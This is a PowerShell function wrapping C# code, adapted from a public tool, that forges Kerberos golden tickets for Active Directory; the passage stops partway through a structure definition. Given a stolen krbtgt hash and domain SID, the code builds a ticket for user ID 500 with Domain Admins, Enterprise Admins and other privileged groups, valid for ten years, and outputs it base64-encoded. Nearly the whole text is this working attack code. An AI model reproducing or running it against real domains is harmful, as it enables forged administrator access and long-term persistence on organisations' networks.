function CreateGoldenTicket
{
<#
    .DESCRIPTION
        Stolen from https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1 and slightly modified to export ticket to disk.
        License: BSD 3-Clause
    #>

    Param
    (
        [string]
        $krbtgthash,
        [string]
        $domainSid,
        [string]
        $username

    )

$sourceGolden = @"
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace drsrdotnet
{
    public class GoldenTicketFactory
    {
        #region constant
        private const int KERBEROS_VERSION = 5;
        private const int ID_APP_KRB_CRED = 22;
        private const int ID_APP_TICKET = 1;
        private const int KRB_NT_PRINCIPAL = 1;
        private const int KRB_NT_SRV_INST = 2;
        private const int KERB_TICKET_FLAGS_initial = 0x00400000;
        private const int KERB_TICKET_FLAGS_pre_authent = 0x00200000;
        private const int KERB_TICKET_FLAGS_renewable = 0x00800000;
        private const int KERB_TICKET_FLAGS_forwardable = 0x40000000;
        private const int USER_DONT_EXPIRE_PASSWORD = (0x00000200);
        private const int USER_NORMAL_ACCOUNT = (0x00000010);
        
        private const int KRB_KEY_USAGE_AS_REP_TGS_REP = 2;
        private const int KERB_NON_KERB_CKSUM_SALT = 17;
        private const int PACINFO_ID_KERB_VALINFO = 0x00020000;
        private const int PACINFO_ID_KERB_EFFECTIVENAME = 0x00020004;
        private const int PACINFO_ID_KERB_FULLNAME = 0x00020008;
        private const int PACINFO_ID_KERB_LOGONSCRIPT = 0x0002000c;
        private const int PACINFO_ID_KERB_PROFILEPATH = 0x00020010;
        private const int PACINFO_ID_KERB_HOMEDIRECTORY = 0x00020014;
        private const int PACINFO_ID_KERB_HOMEDIRECTORYDRIVE = 0x00020018;
        private const int PACINFO_ID_KERB_GROUPIDS = 0x0002001c;
        private const int PACINFO_ID_KERB_LOGONSERVER = 0x00020020;
        private const int PACINFO_ID_KERB_LOGONDOMAINNAME = 0x00020024;
        private const int PACINFO_ID_KERB_LOGONDOMAINID = 0x00020028;
        private const int PACINFO_ID_KERB_EXTRASIDS = 0x0002002c;
        private const int PACINFO_ID_KERB_EXTRASID = 0x00020030;
        private const int PACINFO_ID_KERB_RESGROUPDOMAINSID = 0x00020034;
        private const int PACINFO_ID_KERB_RESGROUPIDS = 0x00020038;
        private const int PACINFO_TYPE_LOGON_INFO = 0x00000001;
        private const int PACINFO_TYPE_CHECKSUM_SRV = 0x00000006;
        private const int PACINFO_TYPE_CHECKSUM_KDC = 0x00000007;
        private const int PACINFO_TYPE_CNAME_TINFO = 0x0000000a;
        private const int DIRTY_ASN1_ID_BOOLEAN = 0x01;
        private const int DIRTY_ASN1_ID_INTEGER = 0x02;
        private const int DIRTY_ASN1_ID_BIT_STRING = 0x03;
        private const int DIRTY_ASN1_ID_OCTET_STRING = 0x04;
        private const int DIRTY_ASN1_ID_NULL = 0x05;
        private const int DIRTY_ASN1_ID_OBJECT_IDENTIFIER = 0x06;
        private const int DIRTY_ASN1_ID_GENERAL_STRING = 0x1b;
        private const int DIRTY_ASN1_ID_GENERALIZED_TIME = 0x18;
        private const int DIRTY_ASN1_ID_SEQUENCE = 0x30;
        private const int ID_CTX_KRB_CRED_PVNO = 0;
        private const int ID_CTX_KRB_CRED_MSG_TYPE = 1;
        private const int ID_CTX_KRB_CRED_TICKETS = 2;
        private const int ID_CTX_KRB_CRED_ENC_PART = 3;
        private const int ID_CTX_TICKET_TKT_VNO = 0;
        private const int ID_CTX_TICKET_REALM = 1;
        private const int ID_CTX_TICKET_SNAME = 2;
        private const int ID_CTX_TICKET_ENC_PART = 3;
        private const int ID_APP_ENCKRBCREDPART = 29;
        private const int ID_CTX_ENCKRBCREDPART_TICKET_INFO = 0;
        private const int ID_CTX_ENCKRBCREDPART_NONCE = 1;
        private const int ID_CTX_ENCKRBCREDPART_TIMESTAMP = 2;
        private const int ID_CTX_ENCKRBCREDPART_USEC = 3;
        private const int ID_CTX_ENCKRBCREDPART_S_ADDRESS = 4;
        private const int ID_CTX_ENCKRBCREDPART_R_ADDRESS = 5;
        private const int ID_CTX_KRBCREDINFO_KEY = 0;
        private const int ID_CTX_KRBCREDINFO_PREALM = 1;
        private const int ID_CTX_KRBCREDINFO_PNAME = 2;
        private const int ID_CTX_KRBCREDINFO_FLAGS = 3;
        private const int ID_CTX_KRBCREDINFO_AUTHTIME = 4;
        private const int ID_CTX_KRBCREDINFO_STARTTIME = 5;
        private const int ID_CTX_KRBCREDINFO_ENDTIME = 6;
        private const int ID_CTX_KRBCREDINFO_RENEW_TILL = 7;
        private const int ID_CTX_KRBCREDINFO_SREAL = 8;
        private const int ID_CTX_KRBCREDINFO_SNAME = 9;
        private const int ID_CTX_KRBCREDINFO_CADDR = 10;
        private const int ID_APP_ENCTICKETPART = 3;
        private const int ID_CTX_ENCTICKETPART_FLAGS = 0;
        private const int ID_CTX_ENCTICKETPART_KEY = 1;
        private const int ID_CTX_ENCTICKETPART_CREALM = 2;
        private const int ID_CTX_ENCTICKETPART_CNAME = 3;
        private const int ID_CTX_ENCTICKETPART_TRANSITED = 4;
        private const int ID_CTX_ENCTICKETPART_AUTHTIME = 5;
        private const int ID_CTX_ENCTICKETPART_STARTTIME = 6;
        private const int ID_CTX_ENCTICKETPART_ENDTIME = 7;
        private const int ID_CTX_ENCTICKETPART_RENEW_TILL = 8;
        private const int ID_CTX_ENCTICKETPART_CADDR = 9;
        private const int ID_CTX_ENCTICKETPART_AUTHORIZATION_DATA = 10;
        private const int ID_CTX_ENCRYPTEDDATA_ETYPE = 0;
        private const int ID_CTX_ENCRYPTEDDATA_KVNO = 1;
        private const int ID_CTX_ENCRYPTEDDATA_CIPHER = 2;
        private const int ID_CTX_AUTHORIZATIONDATA_AD_TYPE = 0;
        private const int ID_CTX_AUTHORIZATIONDATA_AD_DATA = 1;
        private const int ID_AUTHDATA_AD_IF_RELEVANT = 1;
        private const int ID_AUTHDATA_AD_WIN2K_PAC = 128;
        private const int ID_CTX_ENCRYPTIONKEY_KEYTYPE = 0;
        private const int ID_CTX_ENCRYPTIONKEY_KEYVALUE = 1;
        private const int ID_CTX_PRINCIPALNAME_NAME_TYPE = 0;
        private const int ID_CTX_PRINCIPALNAME_NAME_STRING = 1;
        private const int ID_CTX_TRANSITEDENCODING_TR_TYPE = 0;
        private const int ID_CTX_TRANSITEDENCODING_CONTENTS = 1;
        private const int SE_GROUP_MANDATORY = 1;
        private const int SE_GROUP_ENABLED_BY_DEFAULT = 2;
        private const int SE_GROUP_ENABLED = 4;
        #endregion
        #region pinvoke
        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
        private static extern int ber_printf(BerSafeHandle berElement, string format, __arglist);
        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr ber_alloc_t(int option);
        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr ber_free([In] IntPtr berelement, int option);
        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int ber_bvfree(IntPtr value);
        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int ber_flatten(BerSafeHandle berElement, ref IntPtr value);
        [DllImport("wldap32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr ber_init(berval value);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr GetSidSubAuthorityCount(IntPtr psid);
        [DllImport("cryptdll.Dll", CharSet = CharSet.Auto, SetLastError = false)]
        private static extern int CDLocateCheckSum(KERB_CHECKSUM_ALGORITHM type, out IntPtr pCheckSum);
        [DllImport("cryptdll.Dll", CharSet = CharSet.Auto, SetLastError = false)]
        private static extern int CDLocateCSystem(KERB_ETYPE_ALGORITHM type, out IntPtr pCheckSum);
        #endregion
        #region delegates
        delegate int KERB_ECRYPT_Initialize(byte[] Key, int KeySize, int KeyUsage, out IntPtr pContext);
        delegate int KERB_ECRYPT_Encrypt(IntPtr pContext, byte[] data, int dataSize, byte[] output, ref int outputSize);
        delegate int KERB_ECRYPT_Finish(ref IntPtr pContext);
        delegate int KERB_CHECKSUM_Initialize(int unk0, out IntPtr pContext);
        delegate int KERB_CHECKSUM_Sum(IntPtr pContext, int Size, byte[] Buffer);
        delegate int KERB_CHECKSUM_Finalize(IntPtr pContext, byte[] Buffer);
        delegate int KERB_CHECKSUM_Finish(ref IntPtr pContext);
        delegate int KERB_CHECKSUM_InitializeEx(byte[] Key, int KeySize, int KeyUsage, out IntPtr pContext);
        #endregion
        #region pinvoke struct & class
        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_ECRYPT
        {
            int Type0;
	        public int BlockSize;
	        int Type1;
	        int KeySize;
	        public int Size;
	        int unk2;
	        int unk3;
	        IntPtr AlgName;
	        public IntPtr Initialize;
	        public IntPtr Encrypt;
	        IntPtr Decrypt;
	        public IntPtr Finish;
            IntPtr HashPassword;
	        IntPtr RandomKey;
	        IntPtr Control;
	        IntPtr unk0_null;
	        IntPtr unk1_null;
        IntPtr unk2_null;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_CHECKSUM
        {
            public int Type;
            public int Size;
            public int Flag;
            public IntPtr Initialize;
            public IntPtr Sum;
            public IntPtr Finalize;
            public IntPtr Finish;
            public IntPtr InitializeEx;
            public IntPtr unk0_null;
        }
        [StructLayout(LayoutKind.Sequential)]
        private sealed class berval
        {
            public int bv_len;
            public IntPtr bv_val = (IntPtr)0;
        }
        [SuppressUnmanagedCodeSecurity]
        private sealed class BerSafeHandle : SafeHandleZeroOrMinusOneIsInvalid
        {
            internal BerSafeHandle()
                : base(true)
            {
                base.SetHandle(ber_alloc_t(1));
                if (this.handle == (IntPtr)0)
                {
                    throw new OutOfMemoryException();
                }
            }
            internal BerSafeHandle(berval value)
                : base(true)
            {
                base.SetHandle(ber_init(value));
                if (this.handle == (IntPtr)0)
                {
                    throw new Exception("Ber exception");
                }
            }
            protected override bool ReleaseHandle()
            {
                ber_free(this.handle, 1);
                return true;
            }
            public byte[] ToByteArray()
            {
                berval berval = new berval();
                IntPtr intPtr = (IntPtr)0;
                byte[] array;
                try
                {
                    int num2 = ber_flatten(this, ref intPtr);
                    if (num2 == -1)
                    {
                        throw new Exception("ber_flatten exception");
                    }
                    if (intPtr != (IntPtr)0)
                    {
                        Marshal.PtrToStructure(intPtr, berval);
                    }
                    if (berval == null || berval.bv_len == 0)
                    {
                        array = new byte[0];
                    }
                    else
                    {
                        array = new byte[berval.bv_len];
                        Marshal.Copy(berval.bv_val, array, 0, berval.bv_len);
                    }
                }
                finally
                {
                    if (intPtr != (IntPtr)0)
                    {
                        ber_bvfree(intPtr);
                    }
                }
                return array;
            }
        }
        #endregion
        #region enums
        
        public enum KERB_ETYPE_ALGORITHM
        {
            KERB_ETYPE_RC4_HMAC_NT=23,
            KERB_ETYPE_AES128_CTS_HMAC_SHA1_96=17,
            KERB_ETYPE_AES256_CTS_HMAC_SHA1_96=18,
            KERB_ETYPE_DES_CBC_MD5=3,
        }
        public enum KERB_CHECKSUM_ALGORITHM
        {
            KERB_CHECKSUM_HMAC_SHA1_96_AES128 = 15,
            KERB_CHECKSUM_HMAC_SHA1_96_AES256 = 16,
            KERB_CHECKSUM_DES_MAC = -133,
            KERB_CHECKSUM_HMAC_MD5 = -138,
        }
        #endregion
        #region constructor
        private GoldenTicketFactory()
        {
            TicketStart = DateTime.FromFileTimeUtc(((long)(DateTime.Now.ToFileTimeUtc() / 10000000) * 10000000));
            TicketRenew = TicketStart.AddYears(10);
            TicketEnd = TicketStart.AddYears(10);
            SessionKey = new byte[16];
            Random rnd = new Random();
            rnd.NextBytes(SessionKey);
        }
        static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }
        public GoldenTicketFactory(string username, string domainname, SecurityIdentifier domainSid, byte[] domainKey) :
            this(username, domainname, domainSid, domainname.Split('.')[0].ToUpperInvariant(), null, null, domainKey, 500, new int[5] { 513, 512, 520, 518, 519 })
        {
        }
        public GoldenTicketFactory(string username, string domainname, SecurityIdentifier domainSid,
                                string logonDomainName, string servicename, string targetname, byte[] domainKey, int userId, int[] groups)
            : this()
        {
            DomainSid = domainSid;
            UserName = username;
            DomainName = domainname.ToLowerInvariant();
            LogonDomainName = logonDomainName;
            Servicename = servicename;
            TargetName = targetname;
            DomainKey = domainKey;
            DomainKeyType = SetDomainKeyType();
            UserId = userId;
            Groups = groups;
            if (Groups != null)
            {
                GroupAttributes = new int[Groups.Length];
                for (int i = 0; i < GroupAttributes.Length; i++)
                {
                    GroupAttributes[i] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED;
                }
            }
            if (ExtraSids != null)
            {
                ExtraSidAttributes = new int[ExtraSids.Length];
                for (int i = 0; i < ExtraSids.Length; i++)
                {
                    ExtraSidAttributes[i] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED;
                }
            }
            TargetDomainName = AltTargetDomainName = DomainName;
        }
        //TODO
        /*PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids,*/
        #endregion
        #region properties
        public string UserName;
        public string DomainName;
        public SecurityIdentifier DomainSid;
        public string LogonDomainName;
        public string Servicename;
        public string TargetName;
        public string AltTargetDomainName;
        public string TargetDomainName;
        public byte[] Krbtgt;
        public byte[] SessionKey;
        public DateTime TicketStart;
        public DateTime TicketEnd;
        public DateTime TicketRenew;
        public byte[] DomainKey;
        public KERB_ETYPE_ALGORITHM DomainKeyType;
        public int RODC;
        public int UserId;
        public int[] Groups;
        public int[] GroupAttributes;
        public SecurityIdentifier[] ExtraSids;
        public int[]ExtraSidAttributes;
        public KERB_CHECKSUM_ALGORITHM SignatureType
        {
            get
            {
                switch (DomainKeyType)
                {
                    case KERB_ETYPE_ALGORITHM.KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:
                        return KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128;
                    case KERB_ETYPE_ALGORITHM.KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
                        return KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                    case KERB_ETYPE_ALGORITHM.KERB_ETYPE_DES_CBC_MD5:
                        return KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_DES_MAC;
                    case KERB_ETYPE_ALGORITHM.KERB_ETYPE_RC4_HMAC_NT:
                    default:
                        return KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                }
            }
        }
        class KerbExternalName
        {
            public string[] Names;
            public int NameType;
        }
        KerbExternalName ClientName {
            get
            {
                KerbExternalName ken = new KerbExternalName();
                ken.Names = new string[] { UserName };
                ken.NameType = KRB_NT_PRINCIPAL;
                return ken;
            }
        }
        KerbExternalName KerbServiceName
        {
            get
            {
                KerbExternalName ken = new KerbExternalName();
                ken.Names = new string[] {
                    (!String.IsNullOrEmpty(Servicename) ? Servicename : "krbtgt"),
                    (!String.IsNullOrEmpty(TargetName) ? TargetName : DomainName),
                };
                ken.NameType = KRB_NT_SRV_INST;
                return ken;
            }
        }
        int TicketKvno
        {
            get
            {
                return RODC != 0 ? (0x00000001 | (RODC << 16)) : 2;
            }
        }
        int TicketFlags
        {
            get
            {
                if (String.IsNullOrEmpty(Servicename))
                    return (KERB_TICKET_FLAGS_initial | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable);
                return 0;
            }
        }
        private KERB_ETYPE_ALGORITHM SetDomainKeyType()
        {
            if (DomainKey == null)
            {
                throw new Exception("DomainKey not set");
            }
            switch (DomainKey.Length)
            {
                case 16:
                    return KERB_ETYPE_ALGORITHM.KERB_ETYPE_RC4_HMAC_NT;
                case 32:
                    return KERB_ETYPE_ALGORITHM.KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
                //KERB_ETYPE_AES128_CTS_HMAC_SHA1_96
                //
                //KERB_ETYPE_DES_CBC_MD5
                default:
                    throw new Exception("The DomainKey size does not match a known algorithm size");
            }
        }
        #endregion
        public byte[] CreateGoldenTicket()
        {
            
            byte[] pac = Encode();
            //File.WriteAllBytes("pac.bin", pac);
            byte[] EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(pac);
            //File.WriteAllBytes("EncTicketPart.bin", EncTicketPart);
            byte[] EncryptedTicket = kuhl_m_kerberos_encrypt(DomainKeyType, KRB_KEY_USAGE_AS_REP_TGS_REP, DomainKey, EncTicketPart);
            //File.WriteAllBytes("C:\\windows\\temp\\EncryptedTicket.bin", EncryptedTicket);
            byte[] ticketData = kuhl_m_kerberos_ticket_createAppKrbCred(false, EncryptedTicket);
            //File.WriteAllBytes("C:\\windows\\temp\\ticketData.bin", ticketData);
            Console.WriteLine("Returning base64 encoded ticket:\r\n");
            Console.WriteLine(Convert.ToBase64String(ticketData));
            return ticketData;
        }
        private static int MAKE_APP_TAG(int tag)
        {
            return 0x60 + tag;
        }
        private static int MAKE_CTX_TAG(int tag)
        {
            return 0xa0 + tag;
        }
        private byte[] kuhl_m_kerberos_ticket_createAppKrbCred(bool valueIsTicket, byte[] EncryptedTicket)
        {
            BerSafeHandle pBer = new BerSafeHandle();
            BerSafeHandle pBerApp = new BerSafeHandle();
            ber_printf(pBer, "t{{t{i}t{i}t{", __arglist(MAKE_APP_TAG(ID_APP_KRB_CRED), MAKE_CTX_TAG(ID_CTX_KRB_CRED_PVNO), KERBEROS_VERSION, MAKE_CTX_TAG(ID_CTX_KRB_CRED_MSG_TYPE), ID_APP_KRB_CRED, MAKE_CTX_TAG(ID_CTX_KRB_CRED_TICKETS)));
            if (!valueIsTicket)
            {
                ber_printf(pBer, "{t{{t{i}t{", __arglist(MAKE_APP_TAG(ID_APP_TICKET), MAKE_CTX_TAG(ID_CTX_TICKET_TKT_VNO), KERBEROS_VERSION, MAKE_CTX_TAG(ID_CTX_TICKET_REALM)));
                kull_m_asn1_GenString(pBer, DomainName);
                ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_TICKET_SNAME)));
                kuhl_m_kerberos_ticket_createSequencePrimaryName(pBer, KerbServiceName);
                ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_TICKET_ENC_PART)));
                kuhl_m_kerberos_ticket_createSequenceEncryptedData(pBer, DomainKeyType, TicketKvno, EncryptedTicket);
                ber_printf(pBer, "}}}}", __arglist());
            }
            else ber_printf(pBer, "to", __arglist(DIRTY_ASN1_ID_SEQUENCE, EncryptedTicket, EncryptedTicket.Length));
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRB_CRED_ENC_PART)));
            ber_printf(pBerApp, "t{{t{{{t{", __arglist(MAKE_APP_TAG(ID_APP_ENCKRBCREDPART), MAKE_CTX_TAG(ID_CTX_ENCKRBCREDPART_TICKET_INFO), MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_KEY)));
            kuhl_m_kerberos_ticket_createSequenceEncryptionKey(pBerApp, DomainKeyType, SessionKey);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PREALM)));
            kull_m_asn1_GenString(pBerApp, AltTargetDomainName);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PNAME)));
            kuhl_m_kerberos_ticket_createSequencePrimaryName(pBerApp, ClientName);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_FLAGS)));
            kull_m_asn1_BitStringFromULONG(pBerApp, TicketFlags);	/* ID_CTX_KRBCREDINFO_AUTHTIME not present */
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_STARTTIME)));
            kull_m_asn1_GenTime(pBerApp, TicketStart);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_ENDTIME)));
            kull_m_asn1_GenTime(pBerApp, TicketEnd);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_RENEW_TILL)));
            kull_m_asn1_GenTime(pBerApp, TicketRenew);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SREAL)));
            kull_m_asn1_GenString(pBerApp, DomainName);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SNAME)));
            kuhl_m_kerberos_ticket_createSequencePrimaryName(pBerApp, KerbServiceName);
            ber_printf(pBerApp, "}}}}}}", __arglist());
            byte[] pBerVallApp = pBerApp.ToByteArray();
            kuhl_m_kerberos_ticket_createSequenceEncryptedData(pBer, 0, 0, pBerVallApp);
            ber_printf(pBer, "}}}", __arglist());
            return pBer.ToByteArray();
        }
        private byte[] kuhl_m_kerberos_ticket_createAppEncTicketPart(byte[] pac)
        {
            BerSafeHandle pBer, pBerPac;
            pBer = new BerSafeHandle();
            ber_printf(pBer, "t{{t{", __arglist(MAKE_APP_TAG(ID_APP_ENCTICKETPART), MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_FLAGS)));
            kull_m_asn1_BitStringFromULONG(pBer, TicketFlags);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_KEY)));
            kuhl_m_kerberos_ticket_createSequenceEncryptionKey(pBer, DomainKeyType, SessionKey);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CREALM)));
            kull_m_asn1_GenString(pBer, AltTargetDomainName);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CNAME)));
            kuhl_m_kerberos_ticket_createSequencePrimaryName(pBer, ClientName);
            ber_printf(pBer, "}t{{t{i}t{o}}}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_TRANSITED), MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_TR_TYPE), 0, MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_CONTENTS), 0, 0, MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHTIME)));
            kull_m_asn1_GenTime(pBer, TicketStart);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_STARTTIME)));
            kull_m_asn1_GenTime(pBer, TicketStart);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_ENDTIME)));
            kull_m_asn1_GenTime(pBer, TicketEnd);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_RENEW_TILL)));
            kull_m_asn1_GenTime(pBer, TicketRenew);
            ber_printf(pBer, "}", __arglist()); /* ID_CTX_ENCTICKETPART_CADDR not present */
            if (pac != null && pac.Length > 0)
            {
                ber_printf(pBer, "t{{{t{i}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHORIZATION_DATA), MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_IF_RELEVANT, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA)));
                pBerPac = new BerSafeHandle();
                ber_printf(pBerPac, "{{t{i}t{o}}}", __arglist(MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_WIN2K_PAC, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA), pac, pac.Length));
                byte[] pBerValPac = pBerPac.ToByteArray();
                ber_printf(pBer, "o", __arglist(pBerValPac, pBerValPac.Length));
                ber_printf(pBer, "}}}}", __arglist());
            }
            ber_printf(pBer, "}}", __arglist());
            return pBer.ToByteArray();
        }
        private static void kuhl_m_kerberos_ticket_createSequencePrimaryName(BerSafeHandle pBer, KerbExternalName name)
        {
            ber_printf(pBer, "{t{i}t{{", __arglist(MAKE_CTX_TAG(ID_CTX_PRINCIPALNAME_NAME_TYPE), name.NameType, MAKE_CTX_TAG(ID_CTX_PRINCIPALNAME_NAME_STRING)));
            for (int i = 0; i < name.Names.Length; i++)
                kull_m_asn1_GenString(pBer, name.Names[i]);
            ber_printf(pBer, "}}}", __arglist());
        }
        private static void kuhl_m_kerberos_ticket_createSequenceEncryptedData(BerSafeHandle pBer, KERB_ETYPE_ALGORITHM eType, int kvNo, byte[] data)
        {
            ber_printf(pBer, "{t{i}", __arglist(MAKE_CTX_TAG(ID_CTX_ENCRYPTEDDATA_ETYPE), eType));
            if (eType != 0)
                ber_printf(pBer, "t{i}", __arglist(MAKE_CTX_TAG(ID_CTX_ENCRYPTEDDATA_KVNO), kvNo));
            ber_printf(pBer, "t{o}}", __arglist(MAKE_CTX_TAG(ID_CTX_ENCRYPTEDDATA_CIPHER), data, data.Length));
        }
        private static void kuhl_m_kerberos_ticket_createSequenceEncryptionKey(BerSafeHandle pBer, KERB_ETYPE_ALGORITHM eType, byte[] data)
        {
            ber_printf(pBer, "{t{i}t{o}}", __arglist(MAKE_CTX_TAG(ID_CTX_ENCRYPTIONKEY_KEYTYPE), eType, MAKE_CTX_TAG(ID_CTX_ENCRYPTIONKEY_KEYVALUE), data, data.Length));
        }
        static void kull_m_asn1_GenString(BerSafeHandle pBer, string String)
        {
            byte[] data = Encoding.Default.GetBytes(String);
            ber_printf(pBer, "to", __arglist(DIRTY_ASN1_ID_GENERAL_STRING, data, data.Length));
        }
        static void kull_m_asn1_BitStringFromULONG(BerSafeHandle pBer, int data)
        {
            byte[] encodedData = BitConverter.GetBytes(data);
            byte[] reverseEncodedData = new byte[5] { 0, encodedData[3], encodedData[2], encodedData[1], encodedData[0] };
            ber_printf(pBer, "X", __arglist(reverseEncodedData, reverseEncodedData.Length));
        }
        static void kull_m_asn1_GenTime(BerSafeHandle pBer, DateTime st)
        {
            byte[] data = Encoding.Default.GetBytes(st.ToString("yyyyMMddHHmmss") + "Z");
            ber_printf(pBer, "to", __arglist(DIRTY_ASN1_ID_GENERALIZED_TIME, data, data.Length));
        }
        private static byte[] kuhl_m_kerberos_encrypt(KERB_ETYPE_ALGORITHM eType, int keyUsage, byte[] key, byte[] data)
        {
            KERB_ECRYPT pCSystem;
            IntPtr pCSystemPtr;
            int status = CDLocateCSystem(eType, out pCSystemPtr);
            pCSystem = (KERB_ECRYPT)Marshal.PtrToStructure(pCSystemPtr, typeof(KERB_ECRYPT));
            if (status != 0)
                throw new Win32Exception(status, "Error on CDLocateCSystem");
            IntPtr pContext;
            KERB_ECRYPT_Initialize pCSystemInitialize = (KERB_ECRYPT_Initialize)Marshal.GetDelegateForFunctionPointer(pCSystem.Initialize, typeof(KERB_ECRYPT_Initialize));
            KERB_ECRYPT_Encrypt pCSystemEncrypt = (KERB_ECRYPT_Encrypt)Marshal.GetDelegateForFunctionPointer(pCSystem.Encrypt, typeof(KERB_ECRYPT_Encrypt));
            KERB_ECRYPT_Finish pCSystemFinish = (KERB_ECRYPT_Finish)Marshal.GetDelegateForFunctionPointer(pCSystem.Finish, typeof(KERB_ECRYPT_Finish));
            status = pCSystemInitialize(key, key.Length, keyUsage, out pContext);
            if (status != 0)
                throw new Win32Exception(status);
            int outputSize = data.Length;
			if(data.Length % pCSystem.BlockSize != 0)
				outputSize += pCSystem.BlockSize - (data.Length % pCSystem.BlockSize);
			outputSize += pCSystem.Size;
            byte[] output = new byte[outputSize];
			status = pCSystemEncrypt(pContext, data, data.Length, output, ref outputSize);
			pCSystemFinish(ref pContext);
            return output;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;
            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }
            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }
            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        struct KERB_VALIDATION_INFO
        {
            public long LogonTime;
            public long LogoffTime;
            public long KickOffTime;
            public long PasswordLastSet;
            public long PasswordCanChange;
            public long PasswordMustChange;
            public UNICODE_STRING EffectiveName;
            public UNICODE_STRING FullName;
            public UNICODE_STRING LogonScript;
            public UNICODE_STRING ProfilePath;
            public UNICODE_STRING HomeDirectory;
            public UNICODE_STRING HomeDirectoryDrive;
            public UInt16 LogonCount;
            public UInt16 BadPasswordCount;
            public int UserId;
            public int PrimaryGroupId;
            public int GroupCount;
            public IntPtr GroupIds;
            public int UserFlags;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] UserSessionKey;
            public UNICODE_STRING LogonServer;
            public UNICODE_STRING LogonDomainName;
            public IntPtr LogonDomainId;
            public int Reserved11;
            public int Reserved12;
            public int UserAccountControl;
            public int SubAuthStatus;
            public long LastSuccessfulILogon;
            public long LastFailedILogon;
            public int FailedILogonCount;
            public int Reserved3;
            public int SidCount;
            public IntPtr ExtraSids;
            public IntPtr ResourceGroupDomainSid;
